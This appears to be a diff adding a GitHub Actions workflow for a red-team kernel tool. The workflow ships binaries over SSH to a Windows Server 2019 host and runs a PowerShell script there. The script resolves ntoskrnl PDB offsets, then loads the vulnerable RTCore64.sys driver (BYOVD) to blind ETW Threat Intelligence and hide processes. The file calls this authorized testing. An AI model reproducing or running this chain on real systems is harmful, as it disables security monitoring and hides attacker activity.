@@ -1,0 +1,163 @@
+name: Win BYOVD (17763 real kernel)
+
+# The kernel-tier gate. Runs the BYOVD → ETW-TI blind → process hide chain
+# on the authorized physical Win Server 2019 (build 17763, HVCI OFF,
+# SeLoadDriverPrivilege). GitHub's own Windows runners forbid driver loading
+# AND run with HVCI on, so this chain can ONLY execute on this host.
+#
+# State model: the ubuntu runner is the source of truth — it cross-compiles
+# on free linux minutes, ships binaries + a self-contained PowerShell test
+# script to the server, runs them in a fresh run-scoped dir, then cleans up.
+# The server holds NO persistent checkout; state never drifts.
+#
+# Secrets (configured via gh): WIN_HOST, WIN_USER, WIN_SSH_KEY, WIN_KNOWN_HOSTS
+#
+# Authorized red-team security research.
+
+on:
+  workflow_dispatch: {}
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/windows-byovd.yml'
+      - 'crates/operator-kernelsdk/**'
+      - 'crates/operator-kernel-cli/**'
+
+concurrency:
+  group: win-byovd
+  cancel-in-progress: true
+
+jobs:
+  byovd:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install Rust + windows-gnu target
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-pc-windows-gnu
+
+      - name: Cross-compile (windows-gnu)
+        run: |
+          cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml --target x86_64-pc-windows-gnu 2>&1 | tail -3
+          cargo build --manifest-path crates/offset-resolver/Cargo.toml --target x86_64-pc-windows-gnu 2>&1 | tail -3
+          test -f crates/operator-kernel-cli/target/x86_64-pc-windows-gnu/release/nyx-kernel.exe
+          test -f crates/offset-resolver/target/x86_64-pc-windows-gnu/debug/nyx-offset-resolver.exe
+
+      - name: Setup SSH tunnel
+        env:
+          WIN_SSH_KEY: ${{ secrets.WIN_SSH_KEY }}
+          WIN_HOST: ${{ secrets.WIN_HOST }}
+          WIN_USER: ${{ secrets.WIN_USER }}
+          WIN_KNOWN_HOSTS: ${{ secrets.WIN_KNOWN_HOSTS }}
+        run: |
+          mkdir -p ~/.ssh
+          printf '%s\n' "$WIN_SSH_KEY" > ~/.ssh/win_key
+          chmod 600 ~/.ssh/win_key
+          printf '%s\n' "$WIN_KNOWN_HOSTS" >> ~/.ssh/known_hosts
+          cat >> ~/.ssh/config <<EOF
+          Host win
+            HostName $WIN_HOST
+            User $WIN_USER
+            IdentityFile ~/.ssh/win_key
+            IdentitiesOnly yes
+            ConnectTimeout 20
+            ServerAliveInterval 30
+          EOF
+          ssh win 'echo TUNNEL_OK' || { echo "::error::SSH tunnel failed"; exit 1; }
+
+      - name: Write test script (avoids nested-escaping)
+        run: |
+          # The runner script is parameterized by $env:RUN_DIR. scp'd to the
+          # server and invoked via `powershell -File`, so no SSH escaping hell.
+          cat > run_byovd.ps1 <<'PSEOF'
+          param([string]$RunDir)
+          $ErrorActionPreference = 'Continue'
+          $exe       = "$RunDir\nyx-kernel.exe"
+          $resolver  = "$RunDir\nyx-offset-resolver.exe"
+          $sys       = "C:\Users\Administrator\RTCore64.sys"
+
+          # --- 1. Live PDB offset resolution (17763.1339) ---
+          Write-Output "=== PDB resolve (17763) ==="
+          $b = [IO.File]::ReadAllBytes("C:\Windows\System32\ntoskrnl.exe")
+          $pe = [BitConverter]::ToInt32($b, 0x3C)
+          $ddVA = [BitConverter]::ToInt32($b, $pe + 24 + 0xA0)
+          $ddSize = [BitConverter]::ToInt32($b, $pe + 24 + 0xA4)
+          $numSec = [BitConverter]::ToUInt16($b, $pe + 6)
+          $optSz = [BitConverter]::ToUInt16($b, $pe + 20)
+          $secStart = $pe + 24 + $optSz
+          function R2F($rva) {
+            for ($i=0; $i -lt $numSec; $i++) {
+              $s = $secStart + $i*40
+              $va = [BitConverter]::ToInt32($b, $s+12); $vs = [BitConverter]::ToInt32($b, $s+8); $pr = [BitConverter]::ToInt32($b, $s+20)
+              if ($rva -ge $va -and $rva -lt ($va+$vs)) { return $pr + ($rva - $va) }
+            }
+            return $rva
+          }
+          $ddOff = R2F $ddVA
+          for ($i=0; $i -lt ($ddSize/28); $i++) {
+            $e = $ddOff + $i*28
+            if ([BitConverter]::ToInt32($b, $e+12) -eq 6) {
+              $cv = [BitConverter]::ToInt32($b, $e+24)
+              if ($cv -le 0) { $cv = R2F ([BitConverter]::ToInt32($b, $e+20)) }
+              if ($b[$cv] -eq 0x52 -and $b[$cv+1] -eq 0x53 -and $b[$cv+2] -eq 0x44 -and $b[$cv+3] -eq 0x53) {
+                $g = [Guid]::new($b, $cv+4)
+                $guid = $g.ToString('N').ToUpper()
+                $age = [BitConverter]::ToInt32($b, $cv+20)
+                Write-Output "GUID=$guid AGE=$age"
+                & $resolver --guid $guid --age $age --out "$RunDir\offsets_17763.toml" 2>&1 | Select-Object -Last 8
+                break
+              }
+            }
+          }
+          if (Test-Path "$RunDir\offsets_17763.toml") {
+            Write-Output "--- offsets_17763.toml ---"
+            Get-Content "$RunDir\offsets_17763.toml"
+          } else {
+            Write-Output "WARN: PDB resolve produced no TOML"
+          }
+
+          # --- 2. Kernel chain: BYOVD -> KernelRw -> ETW-TI blind ---
+          Write-Output "=== Kernel chain ==="
+          if (Test-Path $sys) {
+            & $exe bootstrap --byovd $sys RTCore64 2>&1 | Tee-Object "$RunDir\kernel.log"
+            Write-Output "KERNEL_EXIT=$LASTEXITCODE"
+          } else {
+            Write-Output "SKIP: $sys not staged (stage RTCore64.sys on the host to enable BYOVD)"
+          }
+          PSEOF
+
+      - name: Stage binaries + script on server
+        run: |
+          RUN_DIR="C:/Users/Administrator/nyx_run_${{ github.run_id }}"
+          ssh win "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$RUN_DIR' | Out-Null\""
+          scp crates/operator-kernel-cli/target/x86_64-pc-windows-gnu/release/nyx-kernel.exe win:"$RUN_DIR/"
+          scp crates/offset-resolver/target/x86_64-pc-windows-gnu/debug/nyx-offset-resolver.exe win:"$RUN_DIR/"
+          scp run_byovd.ps1 win:"$RUN_DIR/"
+          echo "RUN_DIR=$RUN_DIR" >> $GITHUB_ENV
+
+      - name: Run kernel test (SSH, -File so no escaping)
+        run: |
+          ssh win "powershell -NoProfile -ExecutionPolicy Bypass -File '$RUN_DIR\run_byovd.ps1' -RunDir '$RUN_DIR'" 2>&1 | tee byovd_output.txt
+
+      - name: Collect + cleanup
+        if: always()
+        run: |
+          scp win:"$RUN_DIR/offsets_17763.toml" ./offsets_17763.toml 2>/dev/null || true
+          scp win:"$RUN_DIR/kernel.log" ./kernel.log 2>/dev/null || true
+          cat byovd_output.txt 2>/dev/null || true
+          ssh win "powershell -NoProfile -Command \"Remove-Item -Recurse -Force '$RUN_DIR' -ErrorAction SilentlyContinue\"" 2>/dev/null || true
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: byovd-${{ github.run_id }}
+          path: |
+            byovd_output.txt
+            offsets_17763.toml
+            kernel.log
+          if-no-files-found: ignore
+          retention-days: 30
